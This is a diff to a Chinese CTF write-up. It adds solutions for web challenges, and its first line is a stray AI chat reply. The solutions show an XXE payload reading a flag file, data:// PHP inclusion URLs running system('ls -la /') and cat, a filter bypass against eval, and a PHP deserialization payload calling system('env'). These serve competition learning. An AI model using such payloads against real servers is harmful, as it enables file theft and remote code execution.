@@ -1,3 +1,7 @@
+好的，我将把“这是一个...Webshell!?”的解题阐述精简，使其与你提供的其他题解格式保持一致。
+
+---
+
 # CTF WP (ZUENS2020)
 
 ## 安全杂项
@@ -173,21 +177,54 @@
 - 06 第六章 藏经禁地？玄机初探! ✅
 - 07 第七章 灵媒妖穴与阴阳双生符 ✅
 - 08 第八章 天行真言，星图显圣 ✅
+- 这是一个...Webshell!? ✅
+
+  - 观察到 `eval($_GET['shell'])` 存在任意代码执行漏洞，但通过 `!preg_match('/[A-Za-z0-9]/is', $_GET['shell'])` 过滤了字母和数字。
+  - 解题思路：利用PHP的按位取反运算符 `~` 等非字母数字字符构造所需的函数名（如 `system`）和参数（ 根据做题经验一般为env）。
+  - 注意事项：由于 `eval()` 语法限制，不能直接使用表达式作为函数名进行调用，需要通过变量（如 `$_`）进行赋值后再调用。-------AI
+  - 得到flag：通过构造Payload执行 `system('cat /flag')` 等命令获取。
 - 10 第十章 天机符阵 ✅
 
   - 输入内容发现报错信息特点，使用题目已知元素
 
   ```xml
-  <?xml version="1.0"?> 
-  <!DOCTYPE 阵枢 [ 
+  <?xml version="1.0"?>
+  <!DOCTYPE 阵枢 [
       <!ENTITY xxe SYSTEM "file:///var/www/html/flag.txt">
   ]>
   <阵枢>
       <解析>&xxe;</解析>
   </阵枢>
   ```
-
   - 尝试使用 <阵枢> 作为根元素，<解析> 作为包含实体引用的子元素。-----AI
+- 16 第十六章 昆仑星途 ✅
+  - 观察网页中的php代码发现可以利用漏洞访问文件
+  - 通过entrypoint.sh发现flag的文件名是随机的
+  - 通过php.ini发现allow_url_include = On，可以使用
+  - 尝试使用filter：http://127.0.0.1:1960/index.php?file=data://text/plain,<?php%20system('ls%20-la%20/');%20?>获取flag文件名成功------AI
+  - 再次尝试使用filter获取flag内容时失败
+  - 使用http://127.0.0.1:1960/index.php?file=data://text/plain,<?php%20system('cat%20/flag-0200GGsprpcMFYoMEOLww2geegDXIa.txt');%20?>成功获得flag------AI
+- 17 第十七章 星骸迷阵·神念重构 ✅
+  - 观察题目给出的php代码，发现可以利用类A中的a传递php代码并执行
+  - 构造Payload：
+    ```php
+    <?php
+    class A {//定义类A
+        public $a;//定义变量a
+        function __destruct() {
+            eval($this->a);
+        }
+    }
+    $obj = new A();
+    $obj->a = "system('env');";//猜测flag是环境变量
+
+    $serialized_data = serialize($obj);//------询问AI得到序列化函数
+
+    echo $serialized_data;
+    ?>
+    ```
+  - 使用php运行得到url
+  - 得到flag
 - 19 第十九章 星穹真相·补天归源 ✅
 
   - 观察页面发现题目是一段PHP代码
